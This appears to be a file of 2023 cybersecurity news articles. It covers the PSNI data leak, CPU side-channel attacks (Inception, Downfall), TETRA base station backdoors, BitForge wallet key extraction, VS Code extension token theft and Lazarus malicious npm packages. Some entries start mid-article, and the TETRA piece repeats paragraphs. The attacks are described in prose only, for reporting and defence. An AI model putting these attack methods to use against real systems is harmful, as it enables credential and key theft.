      "text": " Freelance JournalistGovernor Kathy Hochul has introduced New York's first-ever statewide cybersecurity strategy, reinforced by a $600m commitment. The strategy emerges as a core State of the State priority, aiming to heighten New York’s resilience against contemporary cyber-threats.“Our interconnected world demands an interconnected defense leveraging every resource available,” Governor Hochul emphasized. “This strategy sets forth a nation-leading blueprint to ensure New York State stands ready and resilient in the face of cyber threats.”The initiative is designed to shield critical infrastructure, data, networks and technology systems from malicious attacks. By uniting both public and private stakeholders, including local governments, it seeks to orchestrate a unified front against cyber adversaries.The commitment also includes allocating $90m to centralize cybersecurity, with $30m designated for shared services strengthening local governments’ cybersecurity. An additional $500m will be invested in healthcare information technology cybersecurity infrastructure, and $7.4m will expand New York State Police’s cyber units.Additionally, the governor signed legislation to boost New York’s technology talent pool, providing necessary funding for employers to acquire and retain cybersecurity professionals.“The President’s National Cybersecurity Strategy articulates an affirmative vision for a defensible, resilient, and values-aligned digital ecosystem that benefits all Americans and enables our grandest national ambitions,” Walden said.“The New York strategy similarly articulates a fundamentally affirmative vision for cyberspace – that is, it is not simply reactive to threat actor behavior – and advances policy in areas such as public-private operational collaboration, regulation of critical infrastructure, cyber education and workforce development and IT modernization.”"

      "text": " The Police Service of Northern Ireland (PSNI) has mistakenly shared sensitive data of all 10,000 serving police officers in response to a Freedom of Information (FOI) request. The request aimed at determining the numbers of PSNI officers.A FOI request is a formal inquiry made by an individual or organization to a government agency or public institution to obtain access to records, documents, or information held by that entity. The purpose of a FOI request is to promote transparency, accountability, and open government by allowing citizens to request and obtain information about the operations, decisions, and activities of government bodies.Exposed data include the names and rank of all 10,000 serving police officers. The data leaked poses a severe risk for the officials.Chris Todd, PSNI’s senior information risk owner, explained that the data leak was caused by a simple human error.“We operate in an environment at the moment where there is a severe threat to our colleagues from Northern Ireland-related terrorism, and this is the last thing that anybody in the organization wants to be hearing this evening,” said Chris Todd, PSNI’s senior information risk owner, at a news conference in Belfast on Tuesday evening.A PSNI member of staff that responded to the FOI request mistakenly revealed “the surname, the initial, the rank or grade, the location and the department, for each of our current employees across the police service.”The data were leaked in a spreadsheet that was published online this week and that remained accessible for more than two hours before being taken down. “Although it was made available as a result of our own error, anyone who did access the information before it was taken down is responsible for what they do with it next. It is important that data anyone has accessed is deleted immediately,” said Todd.“This is a breach of monumental proportions. Even if it was done accidentally, it still represents a data and security breach that should never have happened,” said Liam Kelly, chair of the Northern Ireland’s Police Federation. “Inadequate or poor oversight of FOI procedures must be addressed and addressed urgently. New safeguards are obviously required to prevent this from ever happening again.” \nCopyright@securityaffairs 2023 "

The two-year competition aims to foster the development of innovative AI systems that can protect critical applications from cyber threats.The White House offers $18.5 million to create new AI systems that can be used to protect critical infrastructure such as electric grids, hospitals, and transportation systems. The US government is asking white hat hackers to develop a novel solution to identify and quickly address vulnerabilities in critical software that can be exploited by threat actors.The launch of the competition was announced Wednesday at the cybersecurity conference Black Hat in Las Vegas.The DARPA also announced that it has allocated an additional $7 million into funding small businesses that want to compete. DARPA aims at creating an ecosystem that will allow small businesses to grow with the support of AI tech giants such as Anthropic, Google, Microsoft, and OpenAI.AI systems can help increase the defense capacity of our infrastructures, above all, they will be the only solutions that will be able to counter criminal actions and attacks by nation-state actors that will employ AI-based systems.Recently US President Bined urged tech giants to to “guide responsible innovation,” clearly the AI plays a crucial role in the future of our society.\nCopyright@securityaffairs 2023 "

      "text": " An unfixed hardcoded encryption key flaw in Dell's Compellent Integration Tools for VMware (CITV) allows attackers to decrypt stored vCenter admin credentials and retrieve the cleartext password.The flaw, tracked as  CVE-2023-39250, is caused by a static AES encryption key, shared across all installs, that is used to encrypt the vCenter credentials stored in the program's configuration file.Dell Compellent is a line of enterprise storage systems offering features such as data progression, live volume, thin provisioning, data snapshots and cloning, and integrated management.The software supports storage integration with VMware vCenter, a widely used platform for managing ESXi virtual machines.However, to integrate the client, it must be configured with VMware vCenter credentials, which are stored in the Dell program's encrypted configuration file.This AES encryption key is used to encrypt the CITV configuration file containing the program's settings, including the entered vCenter admin credentials.As AES is a symmetric cipher, it uses the same key for encrypting and decrypting data. This allows an attacker who extracts the key to easily decrypt the configuration file and retrieve the encrypted password.\"The Dell software needs administrative vCenter credentials to function correctly, and it protects those credentials in their config files with a static AES key,\" Pohl told BleepingComputer.\"Dell is interacting with vCenter servers, and is keeping its credentials in an encrypted confih file that should be completely inaccessible for viewing by anything or anyone other than the Dell software.\"\"Attackers should not be able to get access to the contents of that file, but it is accessible. However, due to this newly discovered vulnerability, attackers can extract the encryption key that the Dell software is using to protect the contents of that file.\"LMG Security's team found that the Dell Compellent software directory contains a JAR file that, when decompiled, revealed a hardcoded static AES key.Using this AES key, Pohl could decrypt the Dell Compellent configuration file and retrieve the user name and password for the VMware vCenter administrator, as shown below.The server containing that key was accessible using weak credentials (admin/admin). However, as seen repeatedly, threat actors can gain access to servers in various ways due to vulnerabilities or bad practices.Also, the issue could be exploitable by rogue insiders or low-privileged external attackers who have access to Dell CITV.In this instance, the LMG team could have gone further by leveraging access to domain controls but instead opted to create a domain admin account, exploiting the opportunity when a network admin mistakenly left their console unlocked.The analysts emailed Dell to inform them about their discovery on April 11th, 2023, but the computer and software vendor initially dismissed the report, misunderstanding the scope.After further communication, Dell promised to roll out a fix by November 2023.As the standard 90-day vulnerability disclosure policy has expired, Pohl has publicly shared his research in a DEFCON session titled \"Private Keys in Public Places.\"Update 8/10/23: After the publishing of this story, Dell shared an advisory for CVE-2023-39250 with BleepingComputer that suggests users change the root password of their Compellent devices as a mitigation.However, it is unclear how this would prevent a local user from extracting the AES key.BleepingComputer has sent follow up questions regarding this advisory and will update this article if we receive a response."

      "text": " A cyberespionage group named 'MoustachedBouncer' has been observed using adversary-in-the-middle (AitM) attacks at ISPs to hack foreign embassies in Belarus.According to an ESET report released today, the researchers observed five distinct campaigns, with the threat actors believed to be active since at least 2014, using AitM at Belarusian ISPs since 2020.The two signature malware frameworks MoustachedBouncer used during this time are 'NightClub,' since 2014, and 'Disco,' introduced in 2020 to support data theft, capturing screenshots, recording audio, and more.The recent method used to breach networks is to use adversary-in-the-middle (AitM) attacks at the ISP level to trick targeted Windows 10 installation into assuming it stands behind a captive portal.The ISPs confirmed to be used by MoustachedBouncer are Beltelecom (wholly state-owned) and Unitary Enterprise AI (largest private).ESET believes the threat actors achieve this by manipulating the traffic either by breaching the ISP infrastructure or collaborating with entities that have access to the network service providers in Belarus.\"Hence, the fake Windows Update page will be displayed to a potential victim upon network connection.\"When a targeted Windows 10 device connects to the network, it will redirect captive portal checks (used to check if a device is connected to the internet) to a Fake Windows update HTML page.This page uses JavaScript to display a \"Get Updates\" button that, when clicked, causes a fake operating system update ZIP file to be downloaded.This ZIP file contains a Go-based malware that creates a scheduled task that executes every minute, fetching another executable, the malware loader, from what appears like a Google Cloud IP address but is likely just there for cover.The malware payloads the MoustachedBouncer has used since 2014 are various versions of the 'NightClub' and 'Disco' malware toolkits, showcasing notable evolution with each new release.NightClub was the first malware framework used by the espionage group, with distinct samples retrieved by ESET's analysts in 2014, 2017, 2020, and 2022.Early versions featured file monitoring and SMTP (email) exfiltration and command and control server communications, while its authors later added a persistence mechanism and a keylogger,The latest version of NightClub, used by the hackers between 2020 and 2022, features new modules for taking screenshots, recording audio, keylogging, and setting up a DNS-tunneling backdoor for C2 communications.The DNS backdoor implements additional commands that give the malware file, directory creation, reading, and searching functions, and process manipulation capabilities.Also, the newest NightClub uses a hardcoded private RSA-2048 key for encrypting its strings, while its configuration is stored in an external file, giving it more stealth and versatility.ESET couldn't determine the infection channel that MoustachedBouncer used for NightClub, so that aspect remains unknown.Disco is a newer malware framework reaching victims through the previously described AitM-based attack chain, which MoustachedBouncer started using in 2020.Disco uses multiple Go-based plugins that expand its functionality, allowing the malware to:Disco also uses SMB (Server Message Block) shares for data exfiltration, a protocol primarily used for shared access to files, printers, and serial ports, so there's no direct transfer to the C2 server.MoustachedBouncer's C2 infrastructure is not accessible directly from the public internet, effectively hiding it from security researchers and protecting it from takedowns.ESET recommends that diplomats and embassy employees based in Belarus use end-to-end encrypted VPN tunnels when accessing the internet to block the AiTM attacks."

The research suggests that the latter group may have adopted Rhysida as one of its preferred ransomware payloads. The shared focus on education and healthcare sectors further solidifies this link.The tactics deployed by Rhysida and Vice Society included remote desktop protocol (RDP) connections, remote PowerShell sessions (WinRM) and the use of tools like PsExec for lateral movement. The attackers demonstrated advanced defense evasion capabilities, deleting logs and forensic artifacts to hinder detection and analysis. Notably, Rhysida’s ransomware payload deployment took only eight days from initial lateral movement to widespread deployment."

With the release of Chrome 77, it switched to biweekly updates to try to reduce this number.With the switch to weekly stable updates, Google further minimizes the patch gap and reduces the window of n-day exploitation opportunity to a single week.While this is definitely a step in the right direction and will positively affect Chrome security, it's essential to underline that it's not ideal in the sense that it won't stop all n-day exploitation.Reducing the interval between updates will stop the exploitation of flaws that demand more complex exploitation paths, which in turn require more time to develop.However, there are some vulnerabilities for which malicious actors can build an effective exploit using known techniques, and these cases will remain a problem.Even in those cases, though, active exploitation will still be reduced to a maximum of seven days in the worst-case scenario, given that users apply security updates as soon as they become available.\"Not all security bug fixes are used for n-day exploitation. But we don’t know which bugs are exploited in practice, and which aren't, so we treat all critical and high severity bugs as if they will be exploited,\" explains Chrome Security Team member Amy Ressler.\"A lot of work goes into making sure these bugs get triaged and fixed as soon as possible.\"\"Rather than having fixes sitting and waiting to be included in the next bi-weekly update, weekly updates will allow us to get important security bug fixes to you sooner, and better protect you and your most sensitive data.\"Ultimately, the new update frequency will decrease the need for unplanned updates, enabling users and system administrators to adhere to a more consistent security maintenance schedule.Unfortunately, the Android ecosystem makes it much harder for Google to control, as in many cases, a patch will be released, and it will take manufacturers months to introduce it into their phone's operating systems."

      "text": " Multiple zero-day vulnerabilities named 'BitForge' in the implementation of widely used cryptographic protocols like GG-18, GG-20, and Lindell 17 affected popular cryptocurrency wallet providers, including Coinbase, ZenGo, Binance, and many more.These vulnerabilities could allow attackers to steal digital assets stored in impacted wallets in seconds without requiring interaction with the user or the vendor.The flaws were discovered by the Fireblocks Cryptography Research Team in May 2023, which collectively named them 'BitForge.'Today, the analysts publicly disclosed BitForge in the \"Small Leaks, Billions Of Dollars: Practical Cryptographic Exploits That Undermine Leading Crypto Wallets\" BlackHat presentation, by which time Coinbase and ZenGo have applied fixes to address the problem.The first flaw (CVE-2023-33241) discovered by Fireblock impacts the GG18 and GG20 threshold signature schemes (TSS), which are considered pioneering and also foundational for the MPC wallet industry, allowing multiple parties to generate keys and co-sign transactions.Fireblock's analysts discovered that depending on the implementation parameters, it is possible for an attacker to send a specially crafted message and extract key shards in 16-bit chunks, retrieving the entire private key from the wallet in 16 repetitions.The flaw stems from a lack of checking on the attacker's Paillier modulus (N) and the status of its encryption based on the existence of small factors or biprimes.\"If exploited, the vulnerability allows a threat actor interacting with the signatories in the TSS protocol to steal their secret shards and ultimately obtain the master secret key,\" reads Fireblock's report.\"The severity of the vulnerability depends on the implementation parameters, so different parameter choices give rise to different attacks with varying degrees of effort/resources required to extract the full key.\"The vulnerability discovered in the Lindell17 2PC protocol (CVE-2023-33242) is of similar nature, allowing an attacker to extract the entire private key after approximately 200 signature attempts.The flaw lies in the implementation of the 2PC protocol rather than the protocol itself and manifests through a mishandling of aborts by wallets, which forces them to continue signing operations that inadvertently expose bits of the private key.The attack that exploits this flaw is \"asymmetric,\" meaning it can be exploited by corrupting the client or the server.In the first scenario, the attacker corrupts the client to make it send commands to the server on their behalf, which will reveal a bit of the server's secret key.Fireblock says 256 such attempts are required to gather enough data to reconstruct the server's entire secret share.However, since there's no limit in place, the attacker can poke the server with many quickly succeeding requests, so the attack can be carried out in a short time.The second scenario targets the secret key of the client, using a compromised server to retrieve it via specially crafted messages. Again, 256 requests are required for complete key extraction.The analysts have also published two proof-of-concept (PoC) exploits for each of the protocols on GitHub.Coinbase told BleepingComputer that they fixed the flaws in its Wallet as a Service (WaaS) solution after the flaws were disclosed, thanking the researchers for their responsible disclosure.\"We would like to thank Fireblocks for identifying and responsibly disclosing this issue. While Coinbase customers and funds were never at risk, maintaining a fully trustless cryptographic model is an important aspect of any MPC implementation,\" said Jeff Lunglhofer, Chief Information Security Officer at Coinbase. \"Setting a high industry bar for safety protects the ecosystem and is critical to the broader adoption of this technology.\" "

This contained personal data of anyone in the UK who was registered to vote between 2014 and 2022, including names and home addresses. The names of those registered as overseas voters were also exposed.The register did not include information of those registered anonymously.Jake Moore, cybersecurity advisor at ESET said that it is “worrying” that the attack went undiscovered for 15 months and the authorities were not alerted of any abnormalities on their systems in that time.“Cyber-criminals work best in stealth mode but rarely are they undetected for this length of time. However complex an attack is, it is saddening to see malicious actors break in and rummage around for so long,” he said.Questions also arose on social media regarding 10 months for the Commission to inform the public of the incident.In addition, the Electoral Commission’s email system was also accessible during the attack, exposing further personal details of voters. As well as name and home address, this included email addresses, telephone numbers and any personal images sent to the Commission.]The Commission said the information affected in the breach “does not pose a high risk to individuals.” However, it had a duty to provide the August 8 notification “due to the high volume of personal data potentially viewed or removed during the cyber-attack” under Articles 33 and 34 of the UK General Data Protection Regulation (GDPR).In its statement, the Commission apologised to all those affected and said it has worked with security specialists to investigate the incident and secure its systems against further attacks.There is currently no indication as to who may have been behind the breach."

This tactic provides a level of evasion against traditional endpoint security measures.Talos' analysis also indicated that the threat actor appears to target English-speaking countries, Bulgaria, China and Vietnam. The GitHub account linked to the attacker features ransom notes in languages associated with these regions. The attackers also exhibited a heightened sensitivity towards Vietnamese victims, initiating their ransom note with an apologetic tone. This subtle linguistic variation might point to the attackers being Vietnamese.The ransomware variant employed is a customized version of Yashma, with the actor compiling it on June 4, 2023. This .NET-based malware retains Yashma's anti-recovery capability, erasing unencrypted files after encryption to impede recovery efforts.At present, the attackers demand ransom payments in Bitcoin to an identified wallet address and double the ransomware price if the victim fails to pay within three days. However, no Bitcoin have been observed in the wallet yet, and the ransom amount remains unspecified, possibly indicating the campaign's early stages."

Bokslag explains that this chip is popular among TETRA basebands from multiple vendors and also used in other products. The following issues were discovered:As part of developing a proof of concept (PoC) exploit, Midnight Blue said it instrumented a TETRA base station to turn it into an attack platform. In doing this, it discovered five additional zero-days in the Motorola MBTS TETRA base station, three of which are rated as high severity.Bokslag says, \"These vulnerabilities could also be used by an attacker with (temporary) physical access to a base station to extract key material or even leave persistent implants in the radio infrastructure allowing for persistence interception capabilities across key rollovers.\"These vulnerabilities were detailed as:CVE-2023-23770: Hardcoded backdoor password in MBTS site controller, allowing for device configuration manipulationCVE-2023-23771: Hardcoded backdoor password in MBTS base radio, allowing for device configuration manipulationCVE-2023-23772: The MBTS site controller fails to check firmware authenticity, allowing for arbitrary code executionCVE-2023-23773: The MBTS base radio fails to check firmware authenticity, allowing for arbitrary code executionCVE-2023-23774: MBTS site controller debug prompt can be unlocked by triggering unhandled exceptions, granting arbitrary code execution on the deviceBokslag says that even though the Motorola MBTS is a legacy base station, and therefore easiest to subvert, these issues combined with investigations of state-of-the-art TETRA equipment from other vendors — which it has undertaken but not yet made public — showcase an ecosystem of equipment that lags years, if not decades, behind what one ought to expect of infrastructure handling highly sensitive communications.He says, \"This paints a picture of a security product that was not being designed as if it was a security product.\"He was keen not to pin the blame purely on Motorola, since it's an industrywide problem. \"It's a classical embedded systems environment, and while it's dealing with security-critical stuff, the engineering is not as if security is a top priority,\" he says.Bokslag says, \"These vulnerabilities could also be used by an attacker with (temporary) physical access to a base station to extract key material or even leave persistent implants in the radio infrastructure allowing for persistence interception capabilities across key rollovers.\"These vulnerabilities were detailed as:Bokslag says that even though the Motorola MBTS is a legacy base station, and therefore easiest to subvert, these issues combined with investigations of state-of-the-art TETRA equipment from other vendors — which it has undertaken but not yet made public — showcase an ecosystem of equipment that lags years, if not decades, behind what one ought to expect of infrastructure handling highly sensitive communications.He says, \"This paints a picture of a security product that was not being designed as if it was a security product.\"He was keen not to pin the blame purely on Motorola, since it's an industrywide problem. \"It's a classical embedded systems environment, and while it's dealing with security-critical stuff, the engineering is not as if security is a top priority,\" he says.He says, \"This paints a picture of a security product that was not being designed as if it was a security product.\"He was keen not to pin the blame purely on Motorola, since it's an industrywide problem. \"It's a classical embedded systems environment, and while it's dealing with security-critical stuff, the engineering is not as if security is a top priority,\" he says.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "New Inception attack leaks sensitive data from all AMD Zen CPUs",
      "text": " Researchers have discovered a new and powerful transient execution attack called 'Inception' that can leak privileged secrets and data using unprivileged processes on all AMD Zen CPUs, including the latest models.Transient execution attacks exploit a feature present on all modern processors named speculative execution, which dramatically increases the performance of CPUs by guessing what will be executed next before a slower operation if completed.If the guess is correct, the CPU has increased performance by not waiting for an operation to finish, and if it guessed wrong, it simply rolls back the change and continues the operation using the new outcome.The problem with speculative execution is that it can leave traces that attackers can observe or analyze to retrieve valuable data that should be otherwise protected.Phantom speculation allows attackers to trigger mispredictions without needing any branch at the misprediction source, i.e., create a speculative execution period (\"transient window\") at arbitrary XOR instructions.TTE is the manipulation of future mispredictions by injecting new predictions into the branch predictor to create exploitable speculative executions.The Inception attack, tracked as CVE-2023-20569, is a novel attack that combines the concepts described above, allowing an attacker to make the CPU believe that an XOR instruction (simple binary operation) is a recursive call instruction.This causes it to overflow the return stack buffer with a target address controlled by the attacker, allowing them to leak arbitrary data from unprivileged processes running on any AMD Zen CPU.The leak is possible even if all mitigations to known speculative execution attacks like Spectre or transient control-flow hijacks, such as Automatic IBRS, have already been applied.Also, the data leak rate achieved through Inception is 39 bytes/sec, which would take about half a second to steal a 16-character password and 6.5 seconds for an RSA key.The researchers say that all AMD Zen-based Ryzen and EPYC CPUs, from Zen 1 to Zen 4, are vulnerable to Phantom and Inception.Specific TTE variants potentially impact Intel CPUs, but Phantom is hard to exploit on Intel thanks to eIBRS mitigations.Although the proof-of-concept created by the ETH Zurich team is meant to be executed on Linux, the attacks should work on any operating system using vulnerable AMD CPUs, as this is a hardware flaw, not a software one.A strategy to mitigate the problem would be to fully flush the branch predictor state when switching between distrusting contexts; however, this introduces a performance overhead between 93.1% and 216.9% on older Zen 1(+) and Zen 2 CPUs.For Zen 3 and Zen 4 CPUs, adequate hardware support for this mitigation strategy was initially absent, but AMD has since released microcode updates to enable this feature.Owners of Zen-based AMD processors are recommended to install the latest microcode updates, which can also arrive as part of computer vendor and/or operating system security updates.BleepingComputer has contacted AMD to learn more about microcode release schedules for the impacted chip architectures, but we have yet to hear back by publication time.Update 8/8 - An AMD spokesperson has sent BleepingComputer the following comment regarding Inception:AMD has received an external report titled ‘INCEPTION’, describing a new speculative side channel attack. AMD believes ‘Inception’ is only potentially exploitable locally, such as via downloaded malware, and recommends customers employ security best practices, including running up-to-date software and malware detection tools.  AMD is not aware of any exploit of ‘Inception’ outside the research environment, at this time. AMD recommends customers apply a µcode patch or BIOS update as applicable for products based on “Zen 3” and “Zen 4” CPU architectures. No µcode patch or BIOS update is necessary for products based on “Zen” or “Zen 2” CPU architectures because these architectures are already designed to flush branch type predictions from the branch predictor. "

This allows for intercepting sensitive personal data such as call metadata, SMS and voice call content, data usage and browsing history, and device IMSI.Stingray attacks have been largely mitigated in 4G. However, since downgrading connections to 2G remains possible, rogue cell stations can still perform these powerful man-in-the-middle attacks.In Android 13, that option is to be found on 'Settings → Network & Internet → SIMs → [select SIM] → Allow 2G.'Starting in Android 14, those managing device fleets, such as government agencies, enterprise entities, or other organizations, can restrict 2G connectivity downgrades on all devices under their control.This option is added on top of over 200 controls available in Android Enterprise, including the ability to disable WiFi, Bluetooth, and data signaling over USB.While all IP-based user traffic on Android is end-to-end encrypted, ensuring that any interceptions won't result in data breaches, Google warns that certain communication types, such as circuit-switched voice calls and SMS messages, can still be exposed on cellular networks.The exposed data is typically protected by the cellular link layer cipher, which the users have no control or visibility over, so its strength and reliability are doubtful.To mitigate this risk, Android 14 introduces a feature that allows users to turn off support for null-cipher connections at the modem level for devices that adopt the latest radio hardware abstraction layer (HAL).Like in the 2G disabling feature, emergency calls can still downgrade to null-cipher connections to avoid jeopardizing users' safety."

      "title": "New Downfall attacks on Intel CPUs steal encryption keys, data",
      "text": " A senior research scientist at Google has devised new CPU attacks to exploit a vulnerability dubbed Downfall that affects multiple Intel microprocessor families and allows stealing passwords, encryption keys, and private data like emails, messages, or banking info from users that share the same computer.Tracked as CVE-2022-40982, the flaw is a transient execution side-channel issue and impacts all processors based on Intel microarchitectures Skylake through Ice Lake.SGX is currently supported only on server central processing units and offers a trusted isolated environment for software that not even the operating system can access.Gather is part of memory optimizations in Intel processors, used to speed up accessing scattered data in memory. However, as Moghimi explains in a technical paper published today:“The gather instruction appears to use a temporal buffer shared across sibling CPU threads, and it transiently forwards data to later dependent instructions, and the data belongs to a different process and gather execution running on the same core.”Using the GDS technique, Moghimi was able to steal AES 128-bit and 256-bit cryptographic keys on a separate virtual machine (VM) from the controlled one, with each system on sibling threads of the same CPU core.In less than 10 seconds, eight bytes at a time, the researcher managed to steal AES round keys and combine them to break the encryption.“For 100 different keys, the first run of the attack was 100% successful for AES-128. The first run of the attack was 86% successful for AES-256.”The researcher notes that failed attempts mean that recovering the entire key required running the attack multiple times because data for the master key did not appear with a high frequency within 10 seconds.Apart from encryption keys, Moghimi provides variants of the GDS attack that can steal arbitrary data at rest because of two conditions where the CPU prefetches this type of information into the SIMD register buffers.Downfall attacks require an attacker to be on the same physical processor core as the victim, a context that is provided by today’s shared computing model, Moghimi notes.However, a local program, such as malware, could potentially exploit the flaw to steal sensitive information.Details about the vulnerability stayed private for almost a year to give time to original equipment manufacturers (OEMs) and communication service providers (CSPs) to test and validate the solution, as well as prepare the necessary updates for their customers.Intel told BleepingComputer that the issue does not impact Alder Lake, Raptor Lake, and Sapphire Rapids and that Downfall affects the following three families of processors:Vivek Tiwari, Intel's Vice President of Remediation and Response Engineering, believes that “trying to exploit this outside of a controlled lab environment would be a complex undertaking.”In a statement for BleepingComputer, Intel said that customers can review the risk assessment guidance from the company and decide on disabling the microcode mitigation through mechanisms available in Windows and Linux as well as virtual machine managers (VMMs).Such a decision may be driven by concerns about potential performance issues from the Downfall/GDS mitigation or because the issue does not represent a threat to the environment.A potential impact exists in conditions where gather instructions are frequently executed, which is specific to high-performance computing (HPC) environments.However, the chipmaker says the issue may not be considered a threat in an HPC context because of the conditions of the attack and the typical configuration of these environments.“For example, an attacker would need to be running on the same physical core as the target and be able to run untrusted code, among other things, which are not typical in these environments” - IntelEliminating the risk of Downfall/GDS attacks requires a hardware redesign, which comes at a cost that the industry is not yet ready to pay.Software-based alternatives exist, although these come with caveats and are temporary solutions to the problem. Moghimi proposes four such alternatives, three of them with significant disadvantages:Moghimi warns, though, that without eliminating the root cause of the problem “automated testing can practically find new vulnerabilities in CPUs.”Such tools are not easy to create because they need to better cover the hardware and the supported instructions, a challenging task given the hardware complexity and the proprietary barriers."

      "title": "Microsoft Visual Studio Code flaw lets extensions steal passwords",
      "text": " Microsoft's Visual Studio Code (VS Code) code editor and development environment contains a flaw that allows malicious extensions to retrieve authentication tokens stored in Windows, Linux, and macOS credential managers.These tokens are used for integrating with various third-party services and APIs, such as Git, GitHub, and other coding platforms, so stealing them could have significant consequences for a compromised organization's data security, potentially leading to unauthorized system access, data breaches, etc.The security problem discovered by Cycode is caused by a lack of isolation of authentication tokens in VS Code's 'Secret Storage,' an API that allows extensions to store authentication tokens in the operating system.This is done using Keytar, VS Code's wrapper for communication with the Windows credential manager (on Windows), keychain (on macOS), or keyring (for Linux).This means that any extension running in VS Code, even malicious ones, can gain access to the Secret Storage and abuse Keytar to retrieve any stored tokens.Cycode researcher Alex Ilgayev told BleepingComputer that other than the built-in GitHub and Microsoft authentication, all of the saved credentials from use of third-party extensions.\"Other than the built-in Github/Microsoft authentication, all tokens saved in VSCode come from extensions,\" Ilgayev told BleepingComputer.\"They are either defined by official extensions (from Microsoft), such as Git, Azure, Docker/Kubernetes, etc., or by third-party extensions, such as CircleCI, GitLab, AWS.\"Upon discovering the problem, Cycode's researchers started experimenting by creating a malicious extension to steal tokens for CircleCI, a popular coding platform with VS Code extensions. They did this by modifying CircleCI's extension to run a command that would expose its secure token and even send it straight to the researcher's server.Gradually, they developed a more versatile attack method to extract those secrets without tampering with the target extension's code.The key to this process was discovering that any VS Code extension is authorized to access the keychain because it runs from within the application that the operating system has already granted access to the keychain.Next, the retrieved tokens had to be decrypted, and Cycode found that the algorithm used to encrypt tokens was AES-256-GCM, which is usually safe. However, the key used to encrypt the tokens was derived from the current executable path and the machine ID, making it easy to recreate the key.The retrieved tokens were decrypted by a custom JS script run in VS Code's Electron executable, deciphering and printing all passwords of locally installed extensions.A second flaw discovered by Cycode's researchers was that the 'getFullKey' function retrieves secrets by a given 'extensionId,' which is derived from the extension's name and publisher.This problem allows anyone to modify these fields and trick VS Code into granting them access to another extension's secure tokens.Cycode tested this using a PoC extension that mimicked CircleCI again; however, they noted that replicating any other extension and gaining access to its secrets would be trivial.Cycode told BleepingComputer that they disclosed the problem to Microsoft two months ago, even demonstrating their PoC extension and its ability to steal stored extension tokens.Regardless, Microsoft's engineers didn't see this as a security concern and decided to maintain the existing design of VS Code's secret storage management framework.Update 8/14/23: Microsoft shared the following statement about this issue, which is shared in its entirety below.“This scenario relies on a user to download a malicious extension which would compromise their machine prior to performing the described attack. Extensions execute on the user machine under the same privileges as the software program itself and there is no sandboxing for extensions. To help keep customers safe and protected, we scan extensions for viruses and malware before they are uploaded to the Marketplace, and we check that an extension has a Marketplace certificate and verifiable signature prior to being installed. To help make informed decisions, we recommend consumers use extensions from publishers they trust and review information such as domain verification, ratings, and feedback to prevent unwanted downloads.” – a Microsoft spokesperson"

      "title": "Lazarus Group Launches First Open Source Supply Chain Attacks Targeting Crypto Sector | by Yehuda Gelb | checkmarx-security | Medium",
      "text": " checkmarx-security--ListenShareDuring the last month, we have been monitoring a highly targeted campaign. We began tracking this threat actor in early April 2023, when our systems flagged several suspicious npm packages (those packages were also flagged by our colleagues at Phylum). Later GitHub confirmed that this threat actor was tied to Jade Sleet and TraderTraitor also known as the infamous Lazarus Group, affiliated with North Korea.This operation primarily preyed on companies in the blockchain and cryptocurrency sectors, using a combination of social engineering and malicious npm package dependencies to infiltrate their software supply chains.Active since at least 2009, the Lazarus Group is a North Korean state-sponsored hacking group, an isolated and heavily sanctioned regime. Lazarus is notorious for its involvement in several high-profile and damaging cyberattacks. The group is recognized not only for its cyber-espionage activities but also for its financial motivations, which align well with their recent foray into blockchain and cryptocurrency.Their infamous cyber operations portfolio includes a wide array of devastating cyberattacks over the years and is known for leveraging advanced persistent threats (APTs) in their operations. APTs, by definition, are prolonged and targeted cyberattacks in which a hacker gains access to a network and remains undetected for a significant period. The group has also demonstrated proficiency in spear-phishing campaigns, a tactic involving deceptive emails targeted toward specific individuals or organizations.The Lazarus Group’s ventures into blockchain and cryptocurrency sectors appear to be an extension of their longstanding financially motivated activities. Their operations in these areas allow them to circumvent sanctions and act in anonymity that complicates regulatory enforcement.The threat actors initiated the attack chain by impersonating developers and recruiters to target employees of technology firms, focused on individuals associated with the blockchain, cryptocurrency, and online gambling sectors. The threat actors would establish initial contact through fake persona accounts on platforms such as LinkedIn, Slack, and Telegram, and on establishing a rapport with the targets, usually shifting communication to a different platform.Once contact was established, the attacker would invite the target to collaborate on a GitHub repository, containing malicious npm package dependencies which would then be used to compromise the victim.The malicious packages were engineered to work in pairs and in sequential order. Each pair of malicious packages were published by a separate NPM user account.The victim would receive those two npm packages programmed to execute upon installation and served as first-stage malware that downloaded and executed second-stage malware on the victim’s machine.Once executed, the first package would create a directory, fetch updates from a remote server, and save them in a file.The second package read a token from this file, made a request to a particular URL with this token, wrote the response to another file, and immediately executed that file as a Node.js script.Both packages would also set the environmental variables on the system running it to ignore verifying SSL/TLS certificates.However, from June 29th onwards, the threat actors further refined their tactics. The updated packages were more synchronized and strategic. They still read a token from a file and sent a POST request with the token to a specific URL. The response was streamed and written to a file, but execution was postponed until all the data was fully written, instead of executing it immediately in the previous versions. This change ensured the complete data was available before proceeding to the next step, increasing the chances of a successful operation.Furthermore, the attackers switched from the HTTPS library to Axios for making HTTP requests, providing them with more control and functionalities.Another notable upgrade was in error handling and managing asynchronous operations. While the initial packages had basic error logging with console.error, the new packages introduced Promise rejection handling. This allowed the attacker to catch and manage errors more efficiently, without abruptly terminating the operation.Similarly, handling of asynchronous operations was introduced. Instead of leaving the completion or failure of these tasks unattended, the new packages managed them with Promise-based handling. In simpler terms, this upgrade allowed the attacker to wait for an operation’s outcome before deciding the next steps, offering a more reliable and robust system for handling complex operations.Additionally, some of these improved packages now contained harder-to-detect payloads using base64 encoding, a common method to conceal malware, making their detection and neutralization more challenging.As we delved deeper into this attack, we unearthed packages deployed by the attackers that had previously gone undetected by employing the systematic hunting of attacker TTPs. We will share some of the Yara rules used for tracking these attackers. YARA rules look for patterns, making them especially effective in detecting and thwarting attacks.We have developed YARA rules to aid in identifying and preventing the execution of the malicious scripts used in this campaign.The utilization of social engineering techniques and the exploitation of trust within the open source communities to ensnare victims is a popular method of attack that is far from unique to this campaign. It serves as a potent reminder that we cannot always trust what we see.In some of our recent reports, we’ve delved into these exact tactics:This campaign serves as a reminder that while packages can be created, modified, and deployed with ease, it’s the intention and tactics of those behind the packages that we need to remain most vigilant about. It’s not just about identifying and neutralizing threats, but also understanding the threat actors, their motives, and their evolving tactics.The landscape of cyber threats is in constant change, and only by staying informed, proactive, and cautious can we hope to maintain the security of our digital ecosystem.GitHub took swift action by suspending npm and GitHub accounts linked to the campaign and filing abuse reports with domain hosts to take down the URLs used by the attackers.For further details and inquiries please feel free to send an email to supplychainsecurity@checkmarx.com.Working together to keep the ecosystem safe.----checkmarx-securityYehuda is a security 